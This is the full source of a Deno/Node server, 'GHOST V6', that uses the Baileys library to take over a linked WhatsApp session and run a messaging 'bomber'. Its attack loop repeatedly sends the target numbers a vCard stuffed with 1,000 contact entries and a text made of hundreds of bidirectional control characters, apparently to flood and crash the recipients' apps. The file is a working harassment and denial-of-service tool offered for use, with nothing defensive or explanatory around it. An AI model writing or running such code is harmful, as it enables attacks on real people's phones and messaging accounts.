// stateless_server.js
// VERSION: GHOST-V6-COMPACT-SYNC
// TIMESTAMP: ${new Date().toISOString()}

import { Server } from "npm:socket.io";
import { createServer } from "node:http";
import { 
    default as makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    delay, 
    makeCacheableSignalKeyStore,
    initAuthCreds,
    proto,
    BufferJSON
} from 'npm:@whiskeysockets/baileys';
import { Boom } from 'npm:@hapi/boom';
import pino from 'npm:pino';

const httpServer = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('MALXGMN GHOST SERVER V6 (COMPACT) IS RUNNING');
});

const io = new Server(httpServer, {
    maxHttpBufferSize: 1e8, // Increase buffer to 100MB just in case
    cors: { origin: "*", methods: ["GET", "POST"] }
});

let activeSock = null;
let isAttacking = false;

// --- COMPACT AUTH STATE (V6) ---
const useSocketAuthState = async (socket, initialData) => {
    // Revive creds
    const creds = initialData?.creds 
        ? JSON.parse(JSON.stringify(initialData.creds), BufferJSON.reviver) 
        : await initAuthCreds();

    // Revive keys (limit to essential to keep payload small)
    const keys = initialData?.keys || {};

    const saveState = async () => {
        // Optimization: Only send if keys are not too many
        // For a bomber, we don't need extensive history keys
        const exportData = { creds, keys };
        const json = JSON.stringify(exportData, BufferJSON.replacer);
        
        // If data is too large for websocket (>1MB), we log a warning
        if (json.length > 1000000) {
            console.log("[!] Warning: Session data large, cleaning old keys...");
            // Simple cleanup logic could go here
        }
        
        socket.emit('session_save', json);
    };

    return {
        state: {
            creds,
            keys: {
                get: (type, ids) => {
                    const data = {};
                    ids.forEach(id => {
                        let value = keys[`${type}-${id}`];
                        if (type === 'app-state-sync-key' && value) {
                            value = proto.Message.AppStateSyncKeyData.fromObject(value);
                        }
                        data[id] = value;
                    });
                    return data;
                },
                set: (data) => {
                    for (const category in data) {
                        for (const id in data[category]) {
                            const value = data[category][id];
                            const key = `${category}-${id}`;
                            if (value) {
                                keys[key] = value;
                            } else {
                                delete keys[key];
                            }
                        }
                    }
                    saveState(); 
                }
            }
        },
        saveCreds: async () => await saveState()
    };
};

io.on("connection", (socket) => {
    console.log(`[+] Client Connected: ${socket.id}`);

    socket.on("force_reset", () => {
        if (activeSock) { try { activeSock.end(undefined); } catch {} activeSock = null; }
        socket.emit("status", "Server Resetting...");
    });

    socket.on("init_session", async (rawSessionJson) => {
        try {
            if (activeSock) { try { activeSock.end(undefined); } catch {} activeSock = null; }
            
            let initialData = null;
            if (rawSessionJson) {
                try {
                    initialData = JSON.parse(rawSessionJson, BufferJSON.reviver);
                    socket.emit("status", "Session Loaded. Handshaking...");
                } catch (e) { console.log("[-] JSON Error"); }
            } 
            
            await startSock(socket, initialData);
        } catch (e) {
            socket.emit("error", "Init Error: " + e.message);
        }
    });

    socket.on("use_pairing_code", async (phoneNumber) => {
        if (!activeSock) return socket.emit("error", "Wait for engine...");
        try {
            socket.emit("status", "Requesting Pairing Code...");
            await delay(3000); 
            const code = await activeSock.requestPairingCode(phoneNumber);
            socket.emit("pairing_code", code);
        } catch (e) {
            socket.emit("error", "Pairing Error: " + e.message);
        }
    });

    socket.on("attack_start", (targets) => {
        if (!activeSock) return socket.emit("error", "Not Connected");
        runAttackLoop(socket, targets);
    });

    socket.on("attack_stop", () => { isAttacking = false; });
});

async function startSock(socket, initialData) {
    const { state, saveCreds } = await useSocketAuthState(socket, initialData);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        // Firefox/Windows is usually the fastest for handshake
        browser: ["Firefox", "Windows", "10"], 
        printQRInTerminal: false,
        generateHighQualityLinkPreview: false,
        syncFullHistory: false,
        shouldSyncHistoryMessage: () => false, // STRICT NO HISTORY
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0, 
    });

    activeSock = sock;

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) socket.emit('qr', qr);

        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)
                ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                : true;
            
            if (shouldReconnect) {
                setTimeout(() => startSock(socket, initialData), 3000);
            } else {
                socket.emit('logged_out', 'Session Expired');
                activeSock = null;
            }
        } else if (connection === 'open') {
            socket.emit('ready', 'Connected');
            console.log("[✔] WA Open");
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

async function runAttackLoop(socket, rawTargets) {
    isAttacking = true;
    const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    
    const _f = "\\uD83D\\uDD25"; 
    const _s = "\\u2620\\uFE0F"; 
    const _b = "\\uD83D\\uDCA3"; 
    const _i = "\\u200e\\u200f"; 

    let heavyVcardContent = '';
    for(let i=0; i<1000; i++) {
        heavyVcardContent += 'BEGIN:VCARD\nVERSION:3.0\nFN:' + _f.repeat(5) + 'OVERLOAD_' + i + '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
    }
    
    const vcardPayload = { contacts: { displayName: _s, contacts: [{ vcard: heavyVcardContent }] } };
    const crashText = _b + _i.repeat(500);

    let counter = 0;
    while(isAttacking) {
        try {
            if (!activeSock) { await delay(2000); continue; }
            counter++;
            const batchTasks = [];
            for (const jid of targetJids) {
                batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
                batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
            }
            await Promise.all(batchTasks);
            socket.emit('attack_progress', { count: counter });
            await delay(600); 
        } catch (e) {
            await delay(2000);
        }
    }
}

const PORT = 8000;
httpServer.listen(PORT, () => console.log(`[SERVER] GHOST V6 Active on ${PORT}`));
